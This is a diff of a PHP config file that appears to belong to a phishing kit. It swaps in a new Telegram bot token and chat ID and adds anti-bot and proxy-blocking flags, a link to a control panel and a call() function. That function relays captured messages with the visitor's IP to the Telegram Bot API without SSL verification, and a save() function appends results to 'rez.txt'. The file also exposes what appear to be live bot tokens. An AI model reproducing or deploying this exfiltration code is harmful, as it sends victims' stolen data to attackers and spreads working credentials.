@@ -1,5 +1,42 @@
 <?php
-// config.php
-$TELEGRAM_TOKEN   = '8322003417:AAG_RTz0bDfvKBmESFKru65DtIGUYC4HiAQ';  
-$TELEGRAM_CHAT_ID = '-5021634715';  
 
+$zbayb = "8380088918:AAFu6MotIQtnUncK23rCKtHv8OMrU0N-PAQ";
+$id = "-5098559291";
+
+$antibot = "no";
+
+$block_proxy = "no";
+
+$ipp = "";
+if($_SERVER['REMOTE_ADDR']=="::1"){
+$ipp = "127.0.0.1";
+}else{
+$ipp = $_SERVER['REMOTE_ADDR'];
+}
+$panel_link = str_replace("clients/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");
+
+function call($msg){
+    global $zbayb;
+    global $panel_link;
+    global $id;
+    $info = "
+
+/- MORE INFO -/
+IP: ".$_SERVER['REMOTE_ADDR']."
+TIME: ".date("m/d/Y h:i:sa");
+
+    $c = curl_init('https://api.telegram.org/bot'.$zbayb.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
+    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+    $res = curl_exec($c);
+    curl_close($c);
+    return $res;
+}
+
+function save($txt){
+    $fp = fopen((__DIR__)."/rez.txt", "a");
+    fwrite($fp, $txt);
+    fclose($fp);
+}
+
+?>
